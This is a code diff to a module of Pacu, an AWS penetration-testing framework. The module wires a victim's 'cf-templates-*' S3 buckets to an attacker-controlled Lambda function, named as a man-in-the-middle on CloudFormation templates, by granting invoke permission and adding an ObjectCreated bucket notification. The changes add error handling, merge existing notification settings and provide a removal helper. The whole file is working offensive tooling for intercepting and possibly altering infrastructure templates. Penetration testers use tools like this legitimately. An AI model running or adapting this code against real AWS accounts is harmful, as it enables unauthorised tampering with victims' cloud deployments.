@@ -1,19 +1,24 @@
 #!/usr/bin/env python3
 import argparse
+import copy
 import json
 import os
 import shutil
 import subprocess
 from pathlib import Path
-from typing import TYPE_CHECKING, List
+from typing import TYPE_CHECKING, List, cast
 
 import boto3
+import botocore.exceptions
 from botocore.exceptions import ClientError
 from chalice import cli
+from mypy_boto3_s3.type_defs import NotificationConfigurationTypeDef
 
 from pacu import Main
 from pacu.core.lib import module_data_dir
 from pacu.core.models import AWSKey
+class PacuException(Exception):
+    pass
 
 if TYPE_CHECKING:
     import mypy_boto3_iam
@@ -48,11 +53,21 @@ parser.add_argument('--s3-access-key', help='Pacu key name to use for the deploy
 parser.add_argument('--s3-notifications-setup-key', help='Pacu key name to use for configuring the victims S3 buckets to send notifications to our lambda function.')
 parser.add_argument('--bucket', help=' The S3 Bucket name to target, this is usually something like cf-templates-*.')
 
+LAMBDA_NAME = "cfn__mitm_lambda-dev-update_template"
+
+
 def get_bucket_name(s3: 'mypy_boto3_s3.ServiceResource', lambda_dir: 'Path') -> str:
-    buckets = [b for b in s3.buckets.all() if b.name.startswith('cf-templates')]
+    try:
+        buckets = [b for b in s3.buckets.all() if b.name.startswith('cf-templates')]
+    except botocore.exceptions.ClientError as e:
+        if e.response['Error']['Code'] == 'AccessDenied':
+            raise PacuException('Bucket discovery failed. If you know the S3 bucket you want to target specify the '
+                                '`--bucket` argument when running this module.')
+        else:
+            raise e
 
     if not buckets:
-        raise UserWarning("No 'cf-templates-*' S3 buckets found.")
+        raise PacuException("No 'cf-templates-*' S3 buckets found.")
 
     print("Discovered S3 cf-template buckets:")
     for i, bucket in enumerate(buckets):
@@ -61,23 +76,12 @@ def get_bucket_name(s3: 'mypy_boto3_s3.ServiceResource', lambda_dir: 'Path') -> 
         else:
             print(f"{i}) {bucket.name}")
 
-
     while True:
         selection = input("Select a S3 Bucket to target: ")
         try:
             return buckets[int(selection)].name
         except (ValueError, IndexError):
             print("Invalid selection")
-
-def get_lambda_role(iam: 'mypy_boto3_iam.ServiceResource'):
-    roles = []
-    for role in iam.roles.all():
-        for stmt in role.assume_role_policy_document['Statement']:
-            if stmt['Principal'].get('Service') == 'lambda.amazonaws.com':
-                roles.append(role)
-
-    print("Existing lambda roles:")
-    return prompt(roles, "Select a role to use for the lambda function: ", lambda o: o.name).arn
 
 
 def get_region(bucket, valid_regions) -> str:
@@ -109,7 +113,6 @@ def get_account_id(sess: 'boto3.session.Session'):
     return sess.client('sts').get_caller_identity()['Account']
 
 
-
 # Main is the first function that is called when this module is executed.
 def main(args, pacu_main: 'Main'):
     session = pacu_main.get_active_session()
@@ -129,7 +132,8 @@ def main(args, pacu_main: 'Main'):
     if args.bucket:
         bucket = args.bucket
     else:
-        bucket = get_bucket_name(pacu_main.get_boto3_resource('s3'), lambda_dir)
+        sess = get_session_from_key_name(pacu_main, args.s3_access_key, 'us-east-1')
+        bucket = get_bucket_name(sess.resource('s3'), lambda_dir)
 
     deploy_key: 'AWSKey' = pacu_main.get_aws_key_by_alias(args.lambda_deploy_key)
     if not deploy_key:
@@ -149,19 +153,17 @@ def main(args, pacu_main: 'Main'):
     sess_lambda_deploy = get_session_from_key_name(pacu_main, args.lambda_deploy_key, region)
     sess_s3_notifications = get_session_from_key_name(pacu_main, args.s3_notifications_setup_key, region)
 
-    lambda_name = "cfn__mitm_lambda-dev-lambda_handler"
-
     # No need to remove this on args.delete since we are deleting the lambda either way.
     if not args.delete:
         bucket_account = get_account_id(sess_s3_notifications)
-        add_lambda_permission(sess_lambda_deploy, bucket_account, bucket, lambda_name)
+        add_lambda_permission(sess_lambda_deploy, bucket_account, bucket, LAMBDA_NAME)
 
     if args.delete:
         remove_bucket_notification(sess_s3_notifications, bucket)
     else:
         deploy_sess = get_session_from_key_name(pacu_main, args.lambda_deploy_key, region)
         lambda_account = get_account_id(deploy_sess)
-        lambda_arn = f"arn:aws:lambda:{deploy_sess.region_name}:{lambda_account}:function:{lambda_name}"
+        lambda_arn = f"arn:aws:lambda:{deploy_sess.region_name}:{lambda_account}:function:{LAMBDA_NAME}"
         put_bucket_notification(sess_s3_notifications, bucket, lambda_arn)
 
     return 'Lambda creation succeeded'
@@ -229,37 +231,58 @@ def get_session_from_key_name(pacu_main: 'Main', key_name: str, region: str):
         aws_session_token=key.session_token,
     )
 
+
 def put_bucket_notification(sess: 'boto3.session.Session', bucket: str, lambda_arn: str):
     s3 = sess.client('s3')
     resp = s3.get_bucket_notification_configuration(Bucket=bucket)
-    lambda_conf = resp.get('LambdaFunctionConfigurations', [])
-    lambda_conf = list(filter(lambda c: c['Id'] != 'cfn_notifications', lambda_conf))
-    lambda_conf.append({
+    conf = remove_our_notification(resp)
+    print(conf)
+    conf.setdefault('LambdaFunctionConfigurations', []).append({
         'Id': 'cfn_notifications',
         'LambdaFunctionArn': lambda_arn,
         'Events': [
             's3:ObjectCreated:*',
         ],
     })
-    s3.put_bucket_notification_configuration(
-        Bucket=bucket,
-        NotificationConfiguration={
-            "LambdaFunctionConfigurations": lambda_conf,
-        }
-    )
+    try:
+        s3.put_bucket_notification_configuration(
+            Bucket=bucket,
+            NotificationConfiguration=conf
+        )
+    except ClientError as e:
+        if 'Cannot have overlapping suffixes' in e.response['Error']['Code']:
+            raise PacuException(
+                "\n\n*****\n"
+                "There appears to already be a event configuration set up on this bucket with the same event type."
+                "\n*****\n\n"
+                "S3 only allows configuring a single notification configuration for each event type. It's possible "
+                "that this was left around by a previous run of pacu, if this is the case you can try removing it and "
+                "re-running this module.\n"
+            )
+        else:
+            raise e
 
 
 def remove_bucket_notification(sess: 'boto3.session.Session', bucket: str):
     s3 = sess.client('s3')
     resp = s3.get_bucket_notification_configuration(Bucket=bucket)
-    lambda_conf = list(filter(lambda c: c['Id'] != 'cfn_notifications', resp['LambdaFunctionConfigurations']))
-    print("lambda_conf: ", json.dumps(lambda_conf))
+    resp = remove_our_notification(resp)
+    
     s3.put_bucket_notification_configuration(
         Bucket=bucket,
-        NotificationConfiguration={
-            "LambdaFunctionConfigurations": lambda_conf,
-        }
+        NotificationConfiguration=resp,
     )
+
+
+def remove_our_notification(resp: 'NotificationConfigurationResponseMetadataTypeDef') -> \
+        'NotificationConfigurationTypeDef':
+    del resp['ResponseMetadata']
+    resp = cast('NotificationConfigurationTypeDef', resp)
+    for conf in resp.get('LambdaFunctionConfigurations', []):
+        if conf['Id'] == 'cfn_notifications':
+            resp['LambdaFunctionConfigurations'].remove(conf)
+    return resp
+
 
 def add_lambda_permission(sess, bucket_account, bucket, lambda_name):
     lambda_attacker = sess.client('lambda')
@@ -285,6 +308,7 @@ def remove_lambda_permission(sess: 'boto3.session.Session', lambda_name: str):
         FunctionName=lambda_name,
         StatementId='cfn_notifications',
     )
+
 
 def summary(data, pacu_main):
     return data
